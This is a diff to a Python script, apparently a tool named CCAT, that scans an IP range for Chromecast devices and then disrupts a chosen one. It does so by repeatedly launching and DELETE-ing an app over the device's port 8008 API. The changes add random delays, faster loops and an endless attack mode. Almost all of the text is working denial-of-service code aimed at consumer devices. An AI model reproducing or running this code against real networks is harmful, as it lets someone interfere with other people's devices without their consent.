@@ -3,13 +3,46 @@ import sys
 import time
 import urllib
 import urllib2
-from netaddr import IPRange
+import random
+import itertools
 
 
-def jam(HOST,PORT,timing,attacktime,delay):
+
+def IPRange():
+	IPlist = []
+	print "Input lower bound : "
+	lowerboundraw = str(raw_input())
+	print "Input upper bound : "
+	upperboundraw = str(raw_input())
+	lowerboundstrarray = lowerboundraw.split(".")
+	upperboundstrarray = upperboundraw.split(".")
+	lbint = [0,0,0,0]
+	ubint = [0,0,0,0]
+	count = 0
+	for i in lowerboundstrarray:
+		lbint[count] = int(i)
+		count += 1
+	count = 0
+	for i in upperboundstrarray:
+		ubint[count] = int(i)+1
+		count += 1
+	for q,w,e,r in itertools.product(range(lbint[0],256),range(lbint[1],256),range(lbint[2],256),range(lbint[3],256)):
+		IPlist.append("{0}.{1}.{2}.{3}".format(q,w,e,r))
+		currentIP = "{0}.{1}.{2}.{3}".format(q,w,e,r)
+		ubintIP = "{0}.{1}.{2}.{3}".format(int(ubint[0])-1,int(ubint[1])-1,int(ubint[2])-1,int(ubint[3])-1)
+		if currentIP == ubintIP:
+			return IPlist
+			#break
+
+
+
+def jam(HOST,PORT,timing,attacktime,delayone,delaytwo):
 	timebool = True
 	while timebool:
-
+		
+		delay = random.randint(int(delayone),int(delaytwo+1))
+		
+		
 		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
 		values = {'_':'1111111111111111'}
 
@@ -18,14 +51,16 @@ def jam(HOST,PORT,timing,attacktime,delay):
 		resp = urllib2.urlopen(reqs)
 		dat = resp.read()
 		
-		time.sleep(.1)
+		time.sleep(.001)
 		
 		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
 		s.connect((HOST, PORT))
 		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
 		s.sendall(req)
 		data = s.recv(10240)
+		
 		print data
+		print "%d Seconds" % (delay)
 		
 		time.sleep(delay)
 		
@@ -50,9 +85,8 @@ def chromecast_finder(addresses):
 			request = ("http://"+addr2+":8008/ssdp/device-desc.xml")
 			urllib2.urlopen(request, timeout=.5)
 			ccasts.append(addr)
-			print "1"
+			print "*ALERT* We have found a chromecast on the network *ALERT* "
 			print ""
-			#s.close()
 			ccasts.append(addr)
 		except:
 			print "No Chromecast."
@@ -67,15 +101,16 @@ def choose():
 	print "[1] Continuous"
 	print "[2] Short"
 	print "[3] Custom time"
-	print "[4] Exit"
+	print "[4] Random"
+	print "[5] Exit"
 	attacklen = raw_input("> ")
 	
-	if (attacklen != '1') and (attacklen != '2') and (attacklen != '3') and (attacklen != '4'):
+	if (attacklen != '1') and (attacklen != '2') and (attacklen != '3') and (attacklen != '4') and (attacklen != '5'):
 		print 'invalid input'
 		print ''
 		choose()
 
-	elif attacklen == '4':
+	elif attacklen == '5':
 		print ''
 		print ''
 		sys.exit('Closing CCAT')
@@ -88,10 +123,14 @@ def choose():
 			
 		ip_attack = raw_input("Which Chromecast to attack: ")
 		ip_attack2 = casts[int(ip_attack)]
-		
-		delay = raw_input("Delay between jams\n>")
-		
-		jam(str(ip_attack2),8008, str(attacklen), int(attacktime),int(delay))
+		if attacklen != '4':
+			delayone = int(raw_input("Delay between jams in seconds\n>"))
+			delaytwo = int(delayone) - 1 
+		if attacklen == '4':
+			delayone = raw_input("Delay between jams\n>")
+			delaytwo = raw_input("to\n>")
+		while True:
+			jam(str(ip_attack2),8008, str(attacklen), int(attacktime),int(delayone),int(delaytwo))
 	
 	
 	
@@ -133,20 +172,7 @@ Chevy Swanson - Trent Kenny - Benjamin Donnelly
 
 
 
-adress1 = raw_input('Start IP: ')
-while(len(adress1.split(".")) != 4 and adress1.split(".")[0] <= 255 and adress1.split(".")[1] <= 255 and adress1.split(".")[2] <= 255 and adress1.split(".")[3] <= 255):
-	print "Invalid IP."
-	adress1 = raw_input('Start IP: ')
-adress2 = raw_input('End IP: ')
-while(len(adress2.split(".")) != 4 and adress2.split(".")[0] <= 255 and adress2.split(".")[1] <= 255 and adress2.split(".")[2] <= 255 and adress2.split(".")[3] <= 255):
-	print "Invalid IP."
-	adress2 = raw_input('End IP: ')
-addresses = list(IPRange(adress1, adress2))
+
+addresses = IPRange()
 casts = chromecast_finder(addresses)
 choose()
-
-	
-
-	
-	
-		
